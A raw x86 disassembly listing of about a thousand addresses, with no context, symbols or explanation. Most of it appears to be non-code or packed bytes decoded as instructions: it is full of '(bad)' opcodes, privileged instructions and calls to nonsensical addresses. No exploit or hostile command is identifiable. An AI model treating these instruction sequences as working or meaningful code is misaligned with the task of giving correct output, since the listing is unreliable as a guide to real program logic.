  41a5f9:	add    esi,eax
  41a5fb:	and    eax,DWORD PTR [eax]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	(bad)  
  41a600:	leave  
  41a601:	sti    
  41a602:	inc    ebp
  41a603:	dec    DWORD PTR [ebx-0x39cc13ab]
  41a609:	mov    esi,ecx
  41a60b:	clc    
  41a60c:	(bad)  
  41a60d:	dec    ebp
  41a60e:	iret   
  41a60f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  41a615:	jb     0x41a613
  41a617:	add    bh,al
  41a619:	inc    ebp
  41a61a:	(bad)  
  41a61b:	mov    eax,DWORD PTR [ebp-0xc]
  41a61e:	(bad)  
  41a61f:	xabort 0x64
  41a622:	loopne 0x41a5f1
  41a624:	jmp    FWORD PTR [ebx]
  41a626:	mov    DWORD PTR [ebx],eax
  41a628:	clc    
  41a629:	lock inc ebp
  41a62b:	dec    ebp
  41a62c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  41a632:	loopne 0x41a667
  41a634:	inc    DWORD PTR [ebx]
  41a636:	mov    edi,DWORD PTR [ebx]
  41a638:	hlt    
  41a639:	jne    0x41a688
  41a63b:	mov    esi,DWORD PTR [ebx]
  41a63d:	in     al,0x8d
  41a63f:	dec    ebp
  41a640:	or     BYTE PTR [ebx],dh
  41a642:	jb     0x41a647
  41a644:	add    BYTE PTR [edi+0x45],bl
  41a647:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  41a64d:	add    BYTE PTR [ebx],dh
  41a64f:	mov    esi,DWORD PTR [ebx]
  41a651:	sub    DWORD PTR [ebx],0x6c
  41a654:	mov    eax,DWORD PTR [ebp-0x4]
  41a657:	xor    eax,ecx
  41a659:	pushf  
  41a65a:	mov    ecx,0x338545ba
  41a65f:	clc    
  41a660:	add    edx,DWORD PTR [ebp-0x77]
  41a663:	mov    edi,eax
  41a665:	adc    al,0x45
  41a667:	inc    ebp
  41a668:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  41a670:	mov    eax,DWORD PTR [eax]
  41a672:	loopne 0x41a6c1
  41a674:	inc    ebp
  41a675:	mov    esi,DWORD PTR [ebx]
  41a677:	mov    eax,DWORD PTR [ebx]
  41a679:	nop
  41a67a:	rol    DWORD PTR [eax],cl
  41a67c:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  41a682:	mov    cl,BYTE PTR [ecx+0x450bf888]
  41a688:	dec    ebp
  41a689:	push   esi
  41a68a:	mov    edi,DWORD PTR [edi+0x7b608f8]
  41a690:	xor    eax,edi
  41a692:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  41a699:	mov    DWORD PTR [eax],ecx
  41a69b:	in     al,dx
  41a69c:	into   
  41a69d:	inc    ebp
  41a69e:	iret   
  41a69f:	xor    ecx,edx
  41a6a1:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  41a6a8:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  41a6ae:	dec    ebp
  41a6af:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  41a6b5:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  41a6bc:	mov    DWORD PTR [ecx+0x8],eax
  41a6bf:	mov    eax,DWORD PTR [ebp-0x8]
  41a6c2:	xor    ebx,DWORD PTR [eax]
  41a6c4:	mov    ecx,0xff8b8d40
  41a6c9:	clc    
  41a6ca:	enter  0x4d49,0x48
  41a6ce:	mov    eax,edx
  41a6d0:	lock enter 0x4545,0x8b
  41a6d5:	mov    esi,eax
  41a6d7:	cmp    dh,al
  41a6d9:	rol    edi,0x3
  41a6dc:	enter  0x9140,0x89
  41a6e0:	inc    ebp
  41a6e1:	adc    al,0x8b
  41a6e3:	inc    ebp
  41a6e4:	clc    
  41a6e5:	xor    eax,esi
  41a6e7:	add    eax,edi
  41a6e9:	mov    DWORD PTR [esi-0x24],ebx
  41a6ec:	rol    DWORD PTR [ebp-0x37],0x33
  41a6f0:	add    al,0x3
  41a6f2:	push   ebp
  41a6f3:	mov    esp,ebp
  41a6f5:	fsubr  st,st(4)
  41a6f7:	inc    ebp
  41a6f8:	(bad)  
  41a6f9:	mov    edi,esp
  41a6fb:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  41a701:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41a708:	inc    ebp
  41a709:	test   DWORD PTR [ecx+0x454514f8],ecx
  41a70f:	xor    cl,BYTE PTR [ebx+0xc7909c]
  41a715:	fmul   DWORD PTR [ebx+0xf81485]
  41a71b:	test   DWORD PTR [ecx+0x8b0100],ecx
  41a721:	cld    
  41a722:	or     edi,eax
  41a724:	dec    eax
  41a725:	ret    
  41a726:	push   ebx
  41a727:	inc    ebp
  41a728:	dec    ebp
  41a729:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  41a72f:	mov    DWORD PTR [ebp-0x14],edx
  41a732:	push   ecx
  41a733:	jne    0x41a768
  41a735:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41a73b:	call   0xff879903
  41a740:	mov    eax,DWORD PTR [ebp-0x4]
  41a743:	mov    edi,0x4585c3d8
  41a749:	clc    
  41a74a:	mov    eax,DWORD PTR [ebp-0x8]
  41a74d:	xor    eax,DWORD PTR [eax+0x3]
  41a750:	adc    DWORD PTR [eax+0xc],0x45
  41a754:	inc    ebp
  41a755:	push   eax
  41a756:	mov    ebx,ebp
  41a758:	clc    
  41a759:	inc    DWORD PTR [eax-0x75]
  41a75c:	mov    esi,eax
  41a75e:	clc    
  41a75f:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41a766:	je     0x41a76b
  41a768:	mov    edx,DWORD PTR [eax+0x38]
  41a76b:	jne    0x41a7ba
  41a76d:	lea    ecx,[ebx-0x817ab44]
  41a773:	mul    BYTE PTR [ebx]
  41a775:	dec    DWORD PTR [ebx+0x4089f845]
  41a77b:	fadd   DWORD PTR [ebx]
  41a77d:	inc    ebp
  41a77e:	jmp    0x41a70b
  41a780:	mov    ecx,DWORD PTR [esp+edx*2]
  41a783:	rol    DWORD PTR [ebp+0x45],0x8b
  41a787:	mov    edi,esp
  41a789:	lock (bad) 
  41a78b:	dec    ebp
  41a78c:	ret    
  41a78d:	mov    eax,DWORD PTR [ebp+0x10]
  41a790:	mov    eax,DWORD PTR [ecx-0x4]
  41a793:	mov    eax,edi
  41a795:	fadd   st,st(3)
  41a797:	enter  0x1645,0x8b
  41a79b:	inc    ebp
  41a79c:	cld    
  41a79d:	mov    ecx,DWORD PTR [ebp+0xc]
  41a7a0:	xor    ecx,DWORD PTR [ebp+0x3]
  41a7a3:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  41a7a9:	sub    eax,DWORD PTR [ebp-0x17]
  41a7ac:	xor    eax,DWORD PTR [edx]
  41a7ae:	pushf  
  41a7af:	add    bh,al
  41a7b1:	or     al,0xd8
  41a7b3:	jne    0x41a73a
  41a7b5:	(bad)  
  41a7b6:	clc    
  41a7b7:	mov    al,0x45
  41a7b9:	call   0xffde9dfb
  41a7be:	jmp    0xddaaf4
  41a7c3:	mov    DWORD PTR [ebp-0x30],eax
  41a7c6:	xor    eax,DWORD PTR [ebp+0x3]
  41a7c9:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  41a7cf:	enter  0x8503,0xc
  41a7d3:	clc    
  41a7d4:	inc    ebp
  41a7d5:	inc    ebp
  41a7d6:	push   DWORD PTR [edx]
  41a7d8:	in     al,dx
  41a7d9:	pushf  
  41a7da:	jne    0x41a769
  41a7dc:	mov    edx,eax
  41a7de:	clc    
  41a7df:	dec    ebp
  41a7e0:	out    dx,eax
  41a7e1:	(bad)  
  41a7e2:	dec    esp
  41a7e4:	mov    DWORD PTR [ebp-0x10],ecx
  41a7e7:	lea    eax,[ebp-0x38]
  41a7ea:	cmp    DWORD PTR [ebp-0x64],ecx
  41a7ed:	lea    ecx,[ebx-0x38b2273c]
  41a7f3:	mov    eax,ebx
  41a7f5:	cld    
  41a7f6:	(bad)  
  41a7f7:	iret   
  41a7f8:	mov    esp,0xf74de8cb
  41a7fd:	jmp    0x86aa01
  41a802:	test   DWORD PTR [ebx],esi
  41a804:	je     0x41a7a2
  41a806:	mov    ecx,DWORD PTR [edi]
  41a808:	fdivr  st,st(6)
  41a80a:	mov    DWORD PTR [eax],0xe8ff8bc3
  41a810:	lock iret 
  41a812:	inc    ebp
  41a813:	lock push eax
  41a815:	retf   
  41a816:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  41a81d:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  41a824:	dec    ebp
  41a825:	mov    DWORD PTR [ebx],ebp
  41a827:	fmul   DWORD PTR [ecx+0x458bd845]
  41a82d:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  41a833:	enter  0x1303,0xc
  41a837:	inc    ebp
  41a838:	dec    ebp
  41a839:	xor    edi,DWORD PTR [ebx]
  41a83b:	add    esi,DWORD PTR [edx+0x50]
  41a83e:	mov    ecx,DWORD PTR [eax+esi*8]
  41a841:	inc    ebp
  41a842:	inc    eax
  41a843:	push   eax
  41a844:	mov    ebp,esp
  41a846:	lock inc DWORD PTR [ecx-0x75]
  41a84a:	mov    esp,esp
  41a84c:	fadd   DWORD PTR [eax]
  41a84e:	rol    edi,0xee
  41a851:	test   BYTE PTR [eax],al
  41a853:	dec    esp
  41a854:	push   0x32
  41a856:	dec    DWORD PTR [ebx-0x30ba0314]
  41a85c:	push   eax
  41a85d:	mov    dh,0x21
  41a85f:	add    edi,edi
  41a861:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41a867:	add    BYTE PTR [ebp-0x75],al
  41a86a:	(bad)  
  41a86b:	loopne 0x41a839
  41a86d:	add    BYTE PTR [ebp+0x4584f8c7],al
  41a873:	dec    esp
  41a874:	xor    esi,DWORD PTR [edx]
  41a876:	pushf  
  41a877:	mov    eax,edi
  41a879:	cld    
  41a87a:	(bad)  
  41a87b:	iret   
  41a87c:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41a882:	mov    DWORD PTR [edi],ecx
  41a884:	in     al,0x58
  41a886:	dec    ebp
  41a887:	add    BYTE PTR [ecx+0x4df0e08b],cl
  41a88d:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41a893:	dec    esp
  41a894:	mov    DWORD PTR [edx],esi
  41a896:	fmul   QWORD PTR [ebx-0x30cc03b3]
  41a89c:	add    esi,DWORD PTR [esi+0x3bd80389]
  41a8a2:	test   DWORD PTR [edi],0x3d3800
  41a8a8:	test   DWORD PTR [ebx+0x84dcf8],ecx
  41a8ae:	add    edi,eax
  41a8b0:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  41a8b7:	mov    eax,DWORD PTR [ebx]
  41a8b9:	cld    
  41a8ba:	mov    edi,ecx
  41a8bc:	hlt    
  41a8bd:	mov    dh,0x45
  41a8bf:	add    esi,DWORD PTR [ebx]
  41a8c1:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  41a8c7:	add    BYTE PTR [eax],al
  41a8c9:	mov    eax,DWORD PTR [ebp-0x20]
  41a8cc:	mov    eax,DWORD PTR [eax]
  41a8ce:	call   0x33c5f69a
  41a8d3:	dec    esp
  41a8d4:	add    esi,DWORD PTR [edx]
  41a8d6:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  41a8dc:	cld    
  41a8dd:	iret   
  41a8de:	(bad)  
  41a8df:	mov    ebx,es
  41a8e1:	dec    esp
  41a8e2:	push   0x32
  41a8e4:	lea    esi,[edx]
  41a8e6:	mov    al,0x8b
  41a8e8:	call   0xff4ba3dd
  41a8ed:	iret   
  41a8ee:	inc    ebp
  41a8ef:	mov    WORD PTR [ebx-0x75cdccb4],cs
  41a8f5:	or     al,BYTE PTR ds:0xe4728b
  41a8fb:	or     DWORD PTR [ebp-0x31],ecx
  41a8fe:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  41a905:	cmp    al,cl
  41a907:	je     0x41aae1
  41a90d:	mov    eax,DWORD PTR [ebp-0x10]
  41a910:	mov    eax,DWORD PTR [eax]
  41a912:	xor    eax,edi
  41a914:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41a91b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a91e:	xor    ecx,DWORD PTR [ecx]
  41a920:	bswap  edi
  41a922:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41a92a:	add    DWORD PTR [ebx+0x945dc00],ecx
  41a930:	mov    ecx,edi
  41a932:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a939:	or     al,BYTE PTR [eax]
  41a93b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a93e:	xor    ecx,DWORD PTR [ecx]
  41a940:	bswap  edi
  41a942:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41a94a:	add    DWORD PTR [edi],ecx
  41a94c:	add    BYTE PTR [eax-0x7474ffbb],dl
  41a952:	xor    ebx,esp
  41a954:	mov    al,BYTE PTR [eax]
  41a956:	add    eax,0x8472c7
  41a95b:	dec    esp
  41a95c:	dec    ebp
  41a95d:	xor    dh,BYTE PTR [ebx]
  41a95f:	mov    ecx,DWORD PTR [edi]
  41a961:	lock ror BYTE PTR [ecx],0xcb
  41a965:	iret   
  41a966:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  41a96e:	inc    ebp
  41a96f:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41a975:	iret   
  41a976:	add    eax,0x4c728c
  41a97b:	xor    cl,BYTE PTR [ebp+0xa]
  41a97e:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41a984:	or     eax,0x8c72cf
  41a989:	push   eax
  41a98a:	shl    DWORD PTR [edx],0x4d
  41a98d:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41a993:	fmul   QWORD PTR ds:0xc77200
  41a999:	test   cl,al
  41a99b:	dec    esp
  41a99c:	dec    ebp
  41a99d:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41a9a3:	or     DWORD PTR ds:0x8c72cf,ecx
  41a9a9:	dec    esp
  41a9aa:	enter  0x8532,0x32
  41a9ae:	add    BYTE PTR [ebx+0x945e000],cl
  41a9b4:	mov    ecx,edi
  41a9b6:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a9bd:	or     al,BYTE PTR [eax]
  41a9bf:	mov    ecx,DWORD PTR [ebp-0x24]
  41a9c2:	mov    ecx,DWORD PTR [ecx]
  41a9c4:	xor    ecx,edi
  41a9c6:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  41a9cd:	cmp    al,cl
  41a9cf:	jne    0x41aa1e
  41a9d1:	lea    ecx,[ebx-0x7517cc50]
  41a9d7:	sti    
  41a9d8:	or     eax,0x4d72ff
  41a9dd:	cmp    eax,ecx
  41a9df:	je     0x41aa2e
  41a9e1:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41a9e7:	ret    
  41a9e8:	or     eax,0x8b7245
  41a9ed:	call   0x84c771ba
  41a9f2:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41a9f9:	mov    esi,DWORD PTR [ebx]
  41a9fb:	cld    
  41a9fc:	mov    dl,BYTE PTR [ebp+0x5]
  41a9ff:	xor    esi,DWORD PTR [edx+0x3]
  41aa02:	add    BYTE PTR [ebx],bh
  41aa04:	dec    ebp
  41aa05:	jnp    0x8b40de02
  41aa0b:	mov    ecx,DWORD PTR ds:0x4d72fc
  41aa11:	xor    eax,ecx
  41aa13:	add    ecx,DWORD PTR [ebp+0x3b]
  41aa16:	mov    esi,DWORD PTR [ebp+0x33]
  41aa19:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  41aa1f:	xor    eax,DWORD PTR [eax]
  41aa21:	(bad)  
  41aa22:	ror    DWORD PTR [eax],0x4d
  41aa25:	jb     0x41a9b2
  41aa27:	add    BYTE PTR [ebx],dh
  41aa29:	ja     0x41a9b5
  41aa2b:	sbb    BYTE PTR ds:0x8d7275,cl
  41aa31:	cwde   
  41aa32:	enter  0x50e8,0xf3
  41aa36:	inc    ebp
  41aa37:	dec    DWORD PTR [ebx-0x7574ccbb]
  41aa3d:	fadd   DWORD PTR ds:0xc372c7
  41aa43:	ror    DWORD PTR [ebp+0x13],0x8b
  41aa47:	inc    ebp
  41aa48:	xor    esi,DWORD PTR [ebx]
  41aa4a:	mov    al,BYTE PTR [ebx]
  41aa4c:	or     eax,0x187250
  41aa51:	inc    ebp
  41aa52:	rcl    DWORD PTR [eax+0x4d],0xdc
  41aa56:	mov    edi,edi
  41aa58:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  41aa5e:	jb     0x41a9e9
  41aa60:	add    ah,bl
  41aa62:	shl    DWORD PTR [ebp+0x4d],0xff
  41aa66:	mov    ebx,esp
  41aa68:	xor    eax,DWORD PTR [ebp-0x76]
  41aa6b:	add    ecx,DWORD PTR ds:0xe87208
  41aa71:	repz enter 0x10ff,0x45
  41aa76:	inc    ebp
  41aa77:	mov    edx,DWORD PTR [eax-0x28]
  41aa7a:	xor    bh,al
  41aa7c:	inc    ebx
  41aa7e:	mov    eax,ecx
  41aa80:	mov    eax,0xa00c111
  41aa85:	jne    0x41aacc
  41aa87:	mov    esi,DWORD PTR [ebx]
  41aa89:	test   al,0x3
  41aa8b:	inc    ebp
  41aa8c:	mov    DWORD PTR [eax-0xc],edx
  41aa8f:	mov    ds:0x8b33ff45,al
  41aa94:	lea    edx,[eax]
  41aa96:	xor    BYTE PTR [ebp+0x72],cl
  41aa99:	add    DWORD PTR [eax],eax
  41aa9b:	mov    eax,edi
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	dec    ebp
  41aa9f:	inc    ebp
  41aaa0:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  41aaa6:	retf   
  41aaa7:	mov    edx,ecx
  41aaa9:	adc    al,0x84
  41aaab:	(bad)  
  41aaac:	std    
  41aaad:	ret    
  41aaae:	jmp    FWORD PTR [edi-0x37474bb]
  41aab4:	hlt    
  41aab5:	push   ebp
  41aab6:	(bad)  
  41aab7:	xor    eax,ebx
  41aab9:	(bad)  
  41aaba:	enter  0x1111,0x72
  41aabe:	inc    ebp
  41aabf:	add    BYTE PTR [ebx-0x387deb3f],cl
  41aac5:	cld    
  41aac6:	test   bh,bh
  41aac8:	pushf  
  41aac9:	inc    ebp
  41aaca:	xor    bl,BYTE PTR [edi-0x15]
  41aacd:	pop    ebx
  41aace:	push   0xffffffc2
  41aad0:	inc    DWORD PTR [eax]
  41aad2:	in     al,dx
  41aad3:	mov    eax,DWORD PTR [ebp+0x51]
  41aad6:	push   eax
  41aad7:	inc    ebp
  41aad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aad9:	mov    edi,edi
  41aadb:	or     BYTE PTR [ebx+0x4d80fc16],cl
  41aae1:	add    DWORD PTR [ebx],esi
  41aae3:	add    BYTE PTR [ebx],al
  41aae5:	add    BYTE PTR [ebx],bh
  41aae7:	icebp  
  41aae8:	je     0x41aaf2
  41aaea:	mov    eax,DWORD PTR [edi]
  41aaec:	cld    
  41aaed:	rol    edi,0x72
  41aaf0:	ret    
  41aaf1:	add    BYTE PTR [edx-0x2f],ch
  41aaf4:	lea    edx,[eax]
  41aaf6:	cwde   
  41aaf7:	jne    0x41aae1
  41aaf9:	(bad)  
  41aafa:	clc    
  41aafb:	or     al,0xff
  41aafd:	inc    DWORD PTR [ebp-0x18]
  41ab00:	cmp    ebx,0x18
  41ab03:	inc    DWORD PTR [ebp+0x6]
  41ab06:	call   FWORD PTR [ebp-0x54]
  41ab09:	or     al,0x75
  41ab0b:	push   ebp
  41ab0c:	mov    ebp,esp
  41ab0e:	test   al,0x53
  41ab10:	inc    ebp
  41ab11:	mov    edx,DWORD PTR [eax-0x75]
  41ab14:	imul   ecx,DWORD PTR [eax],0xffffffff
  41ab17:	dec    ebp
  41ab18:	mov    edx,DWORD PTR [edi-0x4]
  41ab1b:	push   ebp
  41ab1c:	dec    ebp
  41ab1d:	push   ecx
  41ab1e:	xor    esi,DWORD PTR [ebx]
  41ab20:	add    edi,DWORD PTR [edi+0x74723b]
  41ab26:	push   0xffffffc7
  41ab28:	inc    DWORD PTR [ecx]
  41ab2a:	lods   al,BYTE PTR ds:[esi]
  41ab2b:	inc    ebp
  41ab2c:	inc    ebp
  41ab2d:	mov    eax,DWORD PTR [ebx]
  41ab2f:	xchg   esp,eax
  41ab30:	or     BYTE PTR [eax],al
  41ab32:	call   0xffcda3c2
  41ab37:	adc    al,0x45
  41ab39:	or     BYTE PTR [ebx+0x800ac01],0x0
  41ab40:	inc    ebp
  41ab41:	inc    ecx
  41ab42:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41ab48:	mov    eax,DWORD PTR [ecx]
  41ab4a:	call   0x338af84f
  41ab4f:	push   0x3
  41ab51:	push   0xc1300f
  41ab56:	dec    ebp
  41ab57:	jo     0x41aae4
  41ab59:	push   0xffffffd4
  41ab5b:	dec    edi
  41ab5d:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  41ab64:	cmp    eax,edi
  41ab66:	cmovne edx,DWORD PTR [edi-0x75]
  41ab6a:	call   DWORD PTR [eax]
  41ab6c:	mov    eax,DWORD PTR [ebp+0x8]
  41ab6f:	call   FWORD PTR [esi+0x14]
  41ab72:	leave  
  41ab73:	inc    ebp
  41ab74:	adc    BYTE PTR [eax+0x55],dl
  41ab77:	jne    0x41ab65
  41ab79:	call   0xff52ab09
  41ab7e:	dec    ebp
  41ab7f:	inc    ebp
  41ab80:	mov    ecx,DWORD PTR [ebx+0x390338b]
  41ab86:	add    BYTE PTR [ebx],bh
  41ab88:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  41ab8c:	push   ebp
  41ab8d:	or     al,0x51
  41ab8f:	dec    ebp
  41ab90:	xor    DWORD PTR [ebx],0xf32039c
  41ab96:	cmp    eax,DWORD PTR [ebp+0x74]
  41ab99:	mov    edi,edi
  41ab9b:	pop    edi
  41ab9c:	adc    BYTE PTR [ebx+0x75],bl
  41ab9f:	ret    0x50
  41aba2:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  41aba6:	(bad)  
  41aba7:	clc    
  41aba8:	mov    esp,ebp
  41abaa:	pop    ecx
  41abab:	mov    ecx,0xf80085c2
  41abb0:	mov    ecx,DWORD PTR [ecx+edx*2]
  41abb3:	push   esi
  41abb4:	push   esi
  41abb5:	(bad)  
  41abb6:	lock inc DWORD PTR [ebp+0x44]
  41abba:	mov    edx,DWORD PTR [eax]
  41abbc:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41abc0:	or     BYTE PTR [ebp+0x7],dl
  41abc3:	push   ecx
  41abc4:	ret    
  41abc5:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  41abcc:	mov    esi,edi
  41abce:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  41abd2:	cmp    BYTE PTR [ebp+0x1],0x89
  41abd6:	add    BYTE PTR [eax+ecx*1],ah
  41abd9:	cmp    DWORD PTR [ebp+0x10],eax
  41abdc:	mov    edx,DWORD PTR [esi]
  41abde:	xchg   esp,eax
  41abdf:	dec    esp
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    ecx,edx
  41abe4:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41abe8:	dec    ebp
  41abe9:	into   
  41abea:	mov    ebp,DWORD PTR [edi+0x240089d8]
  41abf0:	mov    edx,DWORD PTR [eax+0x14]
  41abf3:	das    
  41abf4:	add    al,0x45
  41abf6:	add    BYTE PTR [ebp+0x0],dh
  41abf9:	mov    edi,edi
  41abfb:	and    al,0x50
  41abfd:	mov    eax,DWORD PTR [eax]
  41abff:	and    al,0xd1
  41ac01:	xor    eax,DWORD PTR [esi]
  41ac03:	lea    eax,[ebp+0x8]
  41ac06:	xor    esi,DWORD PTR [edx+0x3]
  41ac09:	add    BYTE PTR [ecx+0x4510fc44],cl
  41ac0f:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  41ac15:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  41ac1f:	xor    bh,bh
  41ac21:	pushf  
  41ac22:	mov    edi,edi
  41ac24:	or     BYTE PTR [esi+ecx*1],cl
  41ac27:	jne    0x41abec
  41ac29:	call   0xaabf5
  41ac2e:	adc    BYTE PTR [ebp+eax*2+0xc],al
  41ac32:	mov    ebx,DWORD PTR [eax]
  41ac34:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41ac38:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41ac40:	pop    esi
  41ac41:	dec    ecx
  41ac43:	and    al,0x10
  41ac45:	call   DWORD PTR [ebp+0x24]
  41ac48:	in     al,dx
  41ac49:	call   0xffc5ab32
  41ac4e:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41ac52:	pushf  
  41ac53:	pop    esi
  41ac54:	mov    ebp,esp
  41ac56:	and    al,0xc2
  41ac58:	push   edi
  41ac59:	add    BYTE PTR [ecx+0x33],al
  41ac5c:	mov    DWORD PTR [ebp+0x24],esi
  41ac5f:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41ac65:	dec    DWORD PTR [eax]
  41ac67:	and    al,0x7
  41ac69:	(bad)  
  41ac6a:	cli    
  41ac6b:	and    al,0x9c
  41ac6d:	or     BYTE PTR [edx],dh
  41ac6f:	sbb    BYTE PTR [ebx],al
  41ac71:	adc    al,0x89
  41ac73:	jmp    DWORD PTR [esp]
  41ac76:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  41ac7c:	adc    al,0x8
  41ac7e:	dec    ebp
  41ac7f:	adc    BYTE PTR [ebp-0x7c],dh
  41ac82:	mov    esi,DWORD PTR [edx]
  41ac84:	and    al,0x24
  41ac86:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  41ac8c:	add    edi,eax
  41ac8e:	pcmpeqb mm1,mm2
  41ac91:	jmp    0x41acdf
  41ac93:	dec    DWORD PTR [eax]
  41ac95:	je     0x41ac82
  41ac97:	mov    edi,DWORD PTR [ecx]
  41ac99:	pop    ebp
  41ac9a:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  41ac9e:	pushf  
  41ac9f:	mov    DWORD PTR [eax-0x8],ebp
  41aca2:	jge    0x41ad0c
  41aca4:	dec    DWORD PTR [ecx+0x5fbf7424]
